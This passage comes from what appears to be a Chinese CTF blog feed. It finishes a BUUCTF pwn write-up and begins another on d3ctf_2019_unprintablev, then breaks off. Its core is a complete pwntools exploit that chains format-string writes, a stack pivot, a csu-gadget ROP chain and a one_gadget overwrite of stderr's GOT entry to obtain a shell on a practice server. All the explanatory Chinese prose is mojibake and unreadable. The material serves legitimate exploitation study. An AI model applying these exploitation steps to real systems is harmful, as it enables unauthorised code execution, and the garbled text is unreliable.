href="#ropé“¾çš„æ„é€ " class="headerlink" title="ropé“¾çš„æ„é€ "></a>ropé“¾çš„æ„é€ </h2><p>æ„é€ ropé“¾ä¹‹å‰ï¼Œæˆ‘ä»¬è¦è€ƒè™‘ä¸€ä¸‹æˆ‘ä»¬éœ€è¦æ€ä¹ˆåšã€‚</p><p>å› ä¸ºæ— æ³•æ³„éœ²libcåŸºå€ï¼Œåªèƒ½åˆ©ç”¨magic gadgetå»å°†stderrä¿®æ”¹ä¸ºone_gadgetåœ°å€ã€‚æ§åˆ¶å‚æ•°ä½¿ç”¨csuç‰‡æ®µï¼Œæœ€ååˆ©ç”¨é‡Œé¢çš„call ptrå»æ‰§è¡Œstderrï¼Œç„¶åè·å–shellã€‚</p><p>è¯´å†™å°±å†™ï¼Œé¦–å…ˆæˆ‘ä»¬å½“æ—¶æ˜¯æ‰§è¡Œäº†ä¸€ä¸ªpop rspï¼Œä½†æ˜¯åé¢è¿˜popäº†ä¸‰ä¸ªå¯„å­˜å™¨</p><p><img src="/../img/2706180-20220419220952979-1955251566.png" alt="image-20220419205614827"></p><p>å› æ­¤è¿ç§»è¿‡æ¥çš„æ—¶å€™ï¼Œå…ˆå¡«å……ä¸‰ä¸ªåƒåœ¾æ•°æ®ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rop=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>ç„¶åè£…å…¥csuç‰‡æ®µçš„åœ°å€,æ­¤æ—¶æˆ‘ä»¬å…ˆæ§åˆ¶rdxçš„å€¼ï¼Œå¦‚æœç°åœ¨æ§åˆ¶rbpçš„è¯ï¼Œcmp     rbx, rbpè¿™ä¸ªæ£€æŸ¥ä¸å¥½è¿‡ã€‚å› æ­¤æˆ‘ä»¬å…ˆæŠŠrbxå’Œrbpè®¾ç½®æˆ0å’Œ1ï¼Œç„¶åæˆ‘ä»¬æ­¤æ—¶å¹¶ä¸éœ€è¦æ‰§è¡Œcall ptr r12ï¼Œå› æ­¤r12è¿™é‡Œæ”¾ä¸€ä¸ªç©ºå‡½æ•°ï¼ˆæŒ‡å‘term_procå‡½æ•°çš„åœ°å€ï¼Œå› ä¸ºcallçš„æ—¶å€™æ˜¯ptrï¼‰æš‚æ—¶çš„payloadå¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rop=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)<span class="comment">#å¼¹å‡ºäº†r13 r14 r15å¯„å­˜å™¨</span></span><br><span class="line">rop+=p64(csu_gadget1)</span><br><span class="line">rop+=p64(<span class="number">0</span>)<span class="comment">#rbx</span></span><br><span class="line">rop+=p64(<span class="number">1</span>)<span class="comment">#rbp</span></span><br><span class="line">rop+=p64(term_hook)</span><br></pre></td></tr></table></figure><p>ç„¶åå¼€å§‹æ§åˆ¶rdxï¼Œç»“åˆmagic gadgetæ¥çœ‹çš„è¯</p><p>adc    DWORD PTR [rbp+0x48],edx</p><p>rdxé‡Œé¢è£…çš„æ˜¯one_gadgetå’Œstderrçš„åç§»ï¼ˆedxå°±æ˜¯rdxå¯„å­˜å™¨çš„ä½å››å­—èŠ‚ï¼‰ï¼Œç”±äºè¿™ä¸ªåç§»ä¸ºè´Ÿçš„ï¼Œå› æ­¤éœ€è¦åŠ ä¸Šä¸€ä¸ª0x10000000000000000 (å–è¡¥ç )</p><p><img src="/../img/2706180-20220419220952622-1140853152.png" alt="image-20220419212514038"></p><p>æ¥ä¸‹æ¥å°±æ˜¯csuçš„æ­£å¸¸ä¼ å‚ï¼Œç­‰æ‰§è¡Œå®Œä¸Šé¢è¿™ä¸ªç‰‡æ®µçš„æ—¶å€™ï¼Œä¼šå†æ¬¡æ‰§è¡Œä¸‹é¢çš„loc_400826ï¼Œåˆ°pop rbpè¿™é‡Œå°†å…¶ä¿®æ”¹ä¸ºstderrçš„åœ°å€-0x48å³å¯ï¼ˆå› ä¸ºmagic gadgetä¸­ç»™stderråŠ äº†0x48ï¼‰ï¼Œç„¶åretåŠ«æŒåˆ°magic gadgetä¸Šï¼Œæœ€åå†æ‰§è¡Œä¸€æ¬¡csuç‰‡æ®µï¼Œæ§åˆ¶r12ä¸ºstderråœ°å€ï¼Œå›åˆ°call ptrçš„æ—¶å€™ï¼Œå³å¯å»æ‰§è¡Œone_gadgetã€‚</p><p>å®Œæ•´ropé“¾ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rop=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)<span class="comment">#å¼¹å‡ºäº†r13 r14 r15å¯„å­˜å™¨</span></span><br><span class="line"><span class="comment">#æ‰§è¡Œadc</span></span><br><span class="line">rop+=p64(csu_gadget1)</span><br><span class="line">rop+=p64(<span class="number">0</span>)<span class="comment">#rbx</span></span><br><span class="line">rop+=p64(<span class="number">1</span>)<span class="comment">#rbp</span></span><br><span class="line">rop+=p64(term_hook)</span><br><span class="line">rop+=p64(offset+<span class="number">0x100000000</span>)</span><br><span class="line">rop+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(csu_gadget2)</span><br><span class="line">rop+=p64(<span class="number">0</span>)<span class="comment">#add rsp 8</span></span><br><span class="line">rop+=p64(<span class="number">0</span>)<span class="comment">#rbx</span></span><br><span class="line">rop+=p64(stderr_got_addr-<span class="number">0x48</span>)<span class="comment">#rbp</span></span><br><span class="line">rop+=<span class="number">32</span>*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">rop+=p64(adc_addr)</span><br><span class="line"><span class="comment">#call stderr</span></span><br><span class="line">rop+=<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span><span class="comment">#rbp</span></span><br><span class="line">rop+=p64(csu_gadget1)</span><br><span class="line">rop+=p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(<span class="number">1</span>)</span><br><span class="line">rop+=p64(stderr_got_addr)</span><br><span class="line">rop+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(csu_gadget2)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="EXPï¼š"><a href="#EXPï¼š" class="headerlink" title="EXPï¼š"></a>EXPï¼š</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./a&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28387</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">leak_stack_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;leak_stack--&gt;  &#x27;</span>,<span class="built_in">hex</span>(leak_stack_addr))</span><br><span class="line">hook_addr=((leak_stack_addr-<span class="number">0x118</span>)&amp;<span class="number">0xff</span>)<span class="comment">#å‡å…«å› ä¸ºbssæ®µæŒ‡é’ˆçš„æŒ‡é’ˆéœ€è¦æŠ¬é«˜ä¸€ä¸ªå†…å­˜å•å…ƒï¼Œå»æŒ¨ç€printfè¿”å›åœ°å€</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(hook_addr))</span><br><span class="line"><span class="keyword">if</span> hook_addr&gt;<span class="number">0xa3</span>:</span><br><span class="line">    judge=<span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    judge=<span class="number">2</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">stderr_got_addr=<span class="number">0x601040</span></span><br><span class="line">read_print_addr=<span class="number">0x4007A3</span></span><br><span class="line">pop_rsp_r13_r14_r15_ret=<span class="number">0x40082d</span></span><br><span class="line">adc_addr=<span class="number">0x4006e8</span></span><br><span class="line">csu_gadget1=<span class="number">0x40082A</span></span><br><span class="line">csu_gadget2=<span class="number">0x400810</span></span><br><span class="line">stderr_offset=<span class="number">0x3C5540</span></span><br><span class="line">one_gadget_offset=<span class="number">0x4526a</span></span><br><span class="line">offset=one_gadget_offset-stderr_offset</span><br><span class="line">term_hook=<span class="number">0x600e10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ropé“¾</span></span><br><span class="line">rop=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)<span class="comment">#å¼¹å‡ºäº†r13 r14 r15å¯„å­˜å™¨</span></span><br><span class="line"><span class="comment">#æ‰§è¡Œadc</span></span><br><span class="line">rop+=p64(csu_gadget1)</span><br><span class="line">rop+=p64(<span class="number">0</span>)<span class="comment">#rbx</span></span><br><span class="line">rop+=p64(<span class="number">1</span>)<span class="comment">#rbp</span></span><br><span class="line">rop+=p64(term_hook)</span><br><span class="line">rop+=p64(offset+<span class="number">0x100000000</span>)</span><br><span class="line">rop+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(csu_gadget2)</span><br><span class="line">rop+=p64(<span class="number">0</span>)<span class="comment">#add rsp 8</span></span><br><span class="line">rop+=p64(<span class="number">0</span>)<span class="comment">#rbx</span></span><br><span class="line">rop+=p64(stderr_got_addr-<span class="number">0x48</span>)<span class="comment">#rbp</span></span><br><span class="line">rop+=<span class="number">32</span>*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">rop+=p64(adc_addr)</span><br><span class="line"><span class="comment">#call stderr</span></span><br><span class="line">rop+=<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span><span class="comment">#rbp</span></span><br><span class="line">rop+=p64(csu_gadget1)</span><br><span class="line">rop+=p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(<span class="number">1</span>)</span><br><span class="line">rop+=p64(stderr_got_addr)</span><br><span class="line">rop+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(csu_gadget2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#åŠ«æŒexitï¼Œæ§åˆ¶æ‰§è¡Œæµ</span></span><br><span class="line">payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x298</span>)+<span class="string">&#x27;c%26$hn&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">16</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p64(read_print_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#sleep(0.5)</span></span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">if</span> judge==<span class="number">1</span>:</span><br><span class="line">    payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(hook_addr-<span class="number">0xa3</span>)+<span class="string">&#x27;c%18$hhn&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> judge==<span class="number">2</span>:</span><br><span class="line">    payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(hook_addr)+<span class="string">&#x27;c%18$hhn&#x27;</span></span><br><span class="line">    payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-hook_addr)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#ä¿®æ”¹printfè¿”å›åœ°å€ï¼Œä¿®æ”¹æŒ‡é’ˆæŒ‡å‘çš„å†…å®¹ï¼ˆä¹Ÿå°±æ˜¯bssæ®µåœ°å€ï¼‰</span></span><br><span class="line"><span class="comment">#æ­¤æ—¶ç¬¬ä¸€æ¬¡æ˜¯ä¸ç”¨ä¿®æ”¹æŒ‡å‘bssæ®µæŒ‡é’ˆçš„ï¼Œä¸è¿‡ä¹‹åçš„æ¯æ¬¡ä¿®æ”¹bssæ®µåœ°å€ï¼Œéƒ½éœ€è¦æå‰ç§»åŠ¨ä¸€ä¸‹æŒ‡å‘bssæ®µçš„æŒ‡é’ˆ</span></span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#sleep(0.5)</span></span><br><span class="line">payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x1088</span>-<span class="number">0xa3</span>)+<span class="string">&#x27;c%13$hn&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#å¼€å§‹ç§»åŠ¨ æŒ‡å‘bssæ®µæŒ‡é’ˆï¼Œæ–¹ä¾¿ç¬¬äºŒæ¬¡çš„å†™å…¥bssæ®µ</span></span><br><span class="line">hook_addr=hook_addr+<span class="number">0x2</span></span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#sleep(0.5)</span></span><br><span class="line"><span class="comment">#ifæ˜¯ç”¨æ¥åˆ¤æ–­ï¼Œ0xa3å’Œè¾“å…¥çš„æŒ‡é’ˆæœ«å°¾è°å¤§ï¼Œä»¥æ¥å†³å®šè°æ”¾åœ¨å‰é¢</span></span><br><span class="line"><span class="keyword">if</span> judge==<span class="number">1</span>:</span><br><span class="line">    payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(hook_addr-<span class="number">0xa3</span>)+<span class="string">&#x27;c%18$hhn&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> judge==<span class="number">2</span>:</span><br><span class="line">    payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(hook_addr)+<span class="string">&#x27;c%18$hhn&#x27;</span></span><br><span class="line">    payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-hook_addr)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#sleep(0.5)</span></span><br><span class="line">payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x60</span>)+<span class="string">&#x27;c%13$hn&#x27;</span></span><br><span class="line">payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-<span class="number">0x60</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#sleep(0.5)</span></span><br><span class="line">hook_addr=hook_addr+<span class="number">0x2</span></span><br><span class="line"><span class="keyword">if</span> judge==<span class="number">1</span>:</span><br><span class="line">    payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(hook_addr-<span class="number">0xa3</span>)+<span class="string">&#x27;c%18$hhn&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> judge==<span class="number">2</span>:</span><br><span class="line">    payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(hook_addr)+<span class="string">&#x27;c%18$hhn&#x27;</span></span><br><span class="line">    payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-hook_addr)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#sleep(0.5)</span></span><br><span class="line">payload=<span class="string">&#x27;%13$hn&#x27;</span></span><br><span class="line">payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x082d</span>)+<span class="string">&#x27;c%23$hn&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">40</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#å› ä¸ºå‰é¢å¡«å……äº†40å­—èŠ‚çš„æ•°æ®ï¼Œè€Œè¾“å…¥çš„èµ·å§‹åœ°å€ä¸º0x601060ï¼ŒåŠ ä¸Š40ï¼Œå°±æ˜¯ropé“¾çš„ä½ç½®ï¼ˆæœ€ç»ˆç¡®å®šropé“¾ä¸º0x601088ï¼‰</span></span><br><span class="line">payload+=rop</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment">#sleep(0.5)</span></span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#é‡æ–°è·å–ä¸€ä¸‹shell</span></span><br><span class="line">p.sendline(<span class="string">&quot;sh&gt;&amp;2&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../img/2706180-20220419223111162-935171477.png"></p><h3 id="æœ¬åœ°é€šäº†ï¼Œè¿œç¨‹æ²¡é€šï¼Œåº”è¯¥å»è€ƒè™‘libcçš„é—®é¢˜"><a href="#æœ¬åœ°é€šäº†ï¼Œè¿œç¨‹æ²¡é€šï¼Œåº”è¯¥å»è€ƒè™‘libcçš„é—®é¢˜" class="headerlink" title="æœ¬åœ°é€šäº†ï¼Œè¿œç¨‹æ²¡é€šï¼Œåº”è¯¥å»è€ƒè™‘libcçš„é—®é¢˜"></a>æœ¬åœ°é€šäº†ï¼Œè¿œç¨‹æ²¡é€šï¼Œåº”è¯¥å»è€ƒè™‘libcçš„é—®é¢˜</h3><p>æœ€åæœ¬åœ°æ‰“é€šï¼Œè¿œç¨‹æ²¡æ‰“é€šã€‚æ­¤æ—¶åº”è¯¥æ„è¯†åˆ°å¯èƒ½æ˜¯libcçš„é—®é¢˜ï¼Œè€Œè¿™é“é¢˜one_gadgetåˆä¼šå—åˆ°libcçš„å½±å“ã€‚å› æ­¤åº”è¯¥å»è€ƒè™‘ä¸‹æœ¬åœ°patchçš„libcæ˜¯å¦å’Œè¿œç¨‹çš„ä¸€æ ·ï¼Œæ£€æŸ¥äº†ä¸€ä¸‹å‘ç°ï¼Œæœ€åçš„é—®é¢˜å‡ºåœ¨äº†libcçš„å°ç‰ˆæœ¬ä¸åŒã€‚æœ€åç”¨buuä¸Šçš„libcå»æœç´¢äº†ä¸€ä¸‹one_gadgetï¼Œæœ€ç»ˆæˆåŠŸè·å–shellã€‚æœ¬åœ°å½“æ—¶èƒ½æˆåŠŸæ˜¯å› ä¸ºæˆ‘patchçš„ä¸€ä¸ª2.23 libcï¼Œåˆå»è¿™ä¸ªlibcé‡Œæœäº†ä¸ªone_gadgetï¼Œæ‰€ä»¥è‡ªç„¶æ˜¯èƒ½æ‰“é€šçš„ï¼Œä½†æ˜¯æœåŠ¡å™¨é‚£è¾¹è‚¯å®šæ˜¯ä»¥å®ƒè‡ªå·±çš„libcä¸ºå‡†â€¦</p>]]></content>
      
      
      <categories>
          
          <category> buuåˆ·é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> one_gadget </tag>
            
            <tag> æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ </tag>
            
            <tag> magic_gadget </tag>
            
            <tag> åŠ«æŒexit_hook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF_d3ctf_2019_unprintablev</title>
      <link href="/posts/7d36ed0c.html"/>
      <url>/posts/7d36ed0c.html</url>
      
        <content type="html"><![CDATA[<p>ï»¿# æ€»ç»“ï¼š</p><p>é€šè¿‡è¿™é“é¢˜çš„å­¦ä¹ ä¸æ”¶è·æœ‰ï¼š</p><p>1ã€close å…³é—­äº†æ ‡å‡†è¾“å‡ºæ—¶ï¼Œå¯ä»¥ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ¥å°†stdoutæŒ‡å‘çš„å†…å®¹ä¿®æ”¹æˆIO_2_1_stderrï¼Œè®©ç¨‹åºé‡æ–°æœ‰å›æ˜¾ï¼Œå…³äºè¿™ä¸ªè¿‡ç¨‹æˆ‘ç”»äº†å¼ å›¾æ–¹ä¾¿è‡ªå·±ç†è§£ã€‚</p><p><img src="/../img/2706180-20220429212145573-1531060697.png"></p><p>2ã€å·²ç»æ‹¿åˆ°libcåŸºåœ°å€çš„æ—¶å€™ï¼Œæˆ‘ä»¬æ‰€éœ€è¦çš„gadgetå°±å¯ä»¥ç›´æ¥å»libcä¸­æ‹¿ï¼Œlibcé‡Œå•¥éƒ½æœ‰ï¼Œlibcé‡Œå•¥éƒ½æœ‰ï¼Œlibcé‡Œå•¥éƒ½æœ‰ï¼Œé‡è¦çš„äº‹æƒ…è¯´ä¸‰éï¼</p><p>3ã€å†™çˆ†ç ´è„šæœ¬æ—¶ï¼Œæ„Ÿè§‰ä¼šæŠ¥é”™çš„åœ°æ–¹ï¼Œç”¨tryå’Œexcepté¢„åˆ¤ä¸€æ‰‹ï¼Œè®©ç¨‹åºå¾—ä»¥ç»§ç»­é‡æ–°è¿è¡Œï¼Œè€Œä¸æ˜¯åŸåœ°å´©æºƒã€‚</p><p>4ã€å¦‚æœclose(1)å…³é—­äº†æ ‡å‡†è¾“å‡ºï¼Œé‚£ä¹ˆæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„å†™å…¥æ•°æ®æœ€å¤šåªèƒ½å†™å…¥0x2000å­—èŠ‚ï¼Œç¨‹åºå¦‚æœæ‰§è¡Œäº†setvbufï¼Œstdoutä¼šå‡ºç°åœ¨bssæ®µï¼Œåä¹‹åˆ™ä¼šåœ¨libcåº“ä¸­ã€‚</p><h1 id="ä¿æŠ¤ç­–ç•¥ï¼š"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h1><p><img src="/../img/2706180-20220429212201826-1274587087.png"></p><p><img src="/../img/2706180-20220429212210885-1992629980.png"></p><h1 id="ç¨‹åºåˆ†æï¼š"><a href="#ç¨‹åºåˆ†æï¼š" class="headerlink" title="ç¨‹åºåˆ†æï¼š"></a>ç¨‹åºåˆ†æï¼š</h1><p><img src="/../img/2706180-20220429212233284-421994592.png"></p><p><img src="/../img/2706180-20220429212243902-940490318.png"></p><p>ç¨‹åºåˆ†æèµ·æ¥å®Œå…¨æ²¡å‹åŠ›ï¼Œå°±æ˜¯å¼€äº†ä¸ªæ²™ç®±ï¼Œç„¶åå…³é—­äº†æ ‡å‡†è¾“å‡ºï¼Œç„¶åå¾ªç¯100æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼ˆå¦‚æœè¾“å…¥d^3CTFåˆ™ä¼šç›´æ¥é€€å‡ºç¨‹åºï¼‰ï¼Œæ•°æ®æ˜¯è¾“å…¥åˆ°äº†bssæ®µã€‚å¦å¤–å°±æ˜¯ä¿æŠ¤å¼€äº†PIE</p><p>è¿™é“é¢˜å¯ä»¥è¯´æ˜¯de1ctf_2019_unprintableè¿™é“çš„å¼ºåŒ–ç‰ˆï¼ˆå› ä¸ºæŸäº›æ–¹é¢è¿™é“é¢˜æ›´ç®€å•ï¼‰ï¼Œå¦‚æœä½ ç°åœ¨åœ¨åšæœ¬é¢˜å¹¶ä¸”æ²¡æœ‰åšè¿‡unprintableè¿™é“é¢˜çš„è¯ï¼Œå»ºè®®å…ˆå»åš<a href="https://www.cnblogs.com/ZIKH26/articles/16167705.html">de1ctf_2019_unprintable</a>è¿™é“é¢˜ã€‚</p><p>å…¶å®è¦è¯´å¼ºåŒ–ä¹Ÿä¸è‡³äºï¼Œè¿™ä¿©çš„åŒºåˆ«å°±æ˜¯ä¸€ä¸ªæ˜¯GetShellï¼Œä¸€ä¸ªæ˜¯orwã€‚å‰é¢çš„æ‰‹æ³•è¿˜æ˜¯å·®ä¸å¤šçš„ï¼Œokï¼Œä¸‹é¢æ¥åˆ†æä¸€ä¸‹è¿™é“é¢˜</p><h1 id="å¤§è‡´æ€è·¯ï¼š"><a href="#å¤§è‡´æ€è·¯ï¼š" class="headerlink" title="å¤§è‡´æ€è·¯ï¼š"></a>å¤§è‡´æ€è·¯ï¼š</h1><p>é¦–å…ˆè¿™é“é¢˜å¯ä»¥åˆ©ç”¨ä¸€ç™¾æ¬¡çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œè¿™ä¸ªç›¸æ¯”äºde1ctf_2019_unprintableçš„è¯æ˜¯ç®€å•å¾ˆå¤šçš„ã€‚å› ä¸ºå¼€äº†æ²™ç®±ï¼Œé‚£å°±è€ƒè™‘orwã€‚æœ‰äº†unprintableè¿™é“é¢˜çš„ç»éªŒï¼Œå°±å¾ˆå®¹æ˜“æƒ³åˆ°è¿™é“ä¸ªé¢˜çš„æ€è·¯ä¹Ÿæ˜¯å°†ropé“¾å¸ƒç½®åˆ°bssï¼Œç„¶åå°†æ ˆè¿ç§»åˆ°bssæ®µå³å¯ã€‚</p><p>ç„¶åå°±æ˜¯æœ€ä¸å¥½æƒ³çš„ç‚¹ï¼Œclose(1)æ€ä¹ˆå¤„ç†ï¼Ÿå¦‚æœæˆ‘ä»¬å¯ä»¥è·å–shellçš„è¯ï¼Œå¯ä»¥å°†æ–‡ä»¶æè¿°ç¬¦é‡å®šä½ä¸€ä¸‹ï¼Œç”¨socket+connectä¹Ÿå¯ä»¥å¯¹æŠ—close(1)ï¼ˆå…·ä½“å‚è€ƒ<a href="https://www.cnblogs.com/ZIKH26/articles/16193814.html">è¿™ç¯‡æ–‡ç« </a>)ï¼‰ä½†æ˜¯å¯¹äºè¿™é“é¢˜è€Œè¨€éƒ½è¡Œä¸é€šï¼Œå¦‚æœä¸èƒ½æå®šè¿™ä¸ªclose(1)ï¼ŒlibcåŸºåœ°å€å’Œç¨‹åºåœ°å€éƒ½æ— æ³•æ³„éœ²ï¼Œé‚£å•¥éƒ½æ²¡æœ‰è¿˜åšä¸ªé”¤å­â€¦</p><p>åœ¨æ­¤å­¦ä¹ åˆ°äº†ä¸€ç§æ–°çš„æ‰‹æ³•æ¥å¤„ç†close(1)</p><blockquote><p>ç¨‹åºä¸­çš„stdoutï¼ˆå®ƒæ˜¯ä¸ªæŒ‡é’ˆï¼‰åªæ˜¯ç›¸å½“äºä¸€ä¸ªè·³æ¿çš„ä½œç”¨ï¼ˆç›®çš„æ˜¯å»libcä¸­å¯»IO_2_1_stdoutåœ°å€ï¼‰ï¼Œè€ŒIO_2_1_stdoutæ‰€ä½¿ç”¨æ–‡ä»¶æè¿°ç¬¦1ï¼Œclose(1)å…³é—­çš„æ˜¯æ–‡ä»¶æè¿°ç¬¦1ï¼Œä½†æ˜¯ç¨‹åºä¸­æƒ³è¦è¿›è¡Œè¾“å‡ºï¼Œå¹¶ä¸æ˜¯å»ç›´æ¥è·Ÿæ–‡ä»¶æè¿°ç¬¦ç›¸æ¥è§¦ï¼Œè€Œæ˜¯é€šè¿‡stdoutæ¥å»è®¿é—®åˆ°æ–‡ä»¶æè¿°ç¬¦(äº‹å®ä¸Šå®ƒè®¿é—®çš„æ˜¯IO_2_1_stdoutè¿™ä¸ªç»“æ„ï¼Œè€Œè¿™ä¸ªç»“æ„ä½¿ç”¨äº†æ–‡ä»¶æè¿°ç¬¦ï¼‰ï¼Œä¸¾ä¸ªä¾‹å­ï¼Œå³ä½¿æ–‡ä»¶æè¿°ç¬¦1è¢«å…³é—­ï¼Œä½†æ˜¯<strong>æ‰§è¡Œputsçš„æ—¶å€™ï¼Œç¨‹åºæ˜¯ä¸çŸ¥é“æ–‡ä»¶æè¿°ç¬¦è¢«å…³é—­äº†ï¼Œå› æ­¤å®ƒä¾ç„¶ä¼šé€šè¿‡stdoutæ¥å»å¯»æ‰¾IO_2_1_stdout</strong>ï¼ˆä»¥è·å–æ–‡ä»¶æè¿°ç¬¦1ï¼‰ï¼Œ<strong>ç­‰æ‰¾åˆ°IO_2_1_stdoutï¼Œç¨‹åºæ‰æ„è¯†åˆ°æ–‡ä»¶æè¿°ç¬¦1è¢«å…³é—­ï¼Œå› 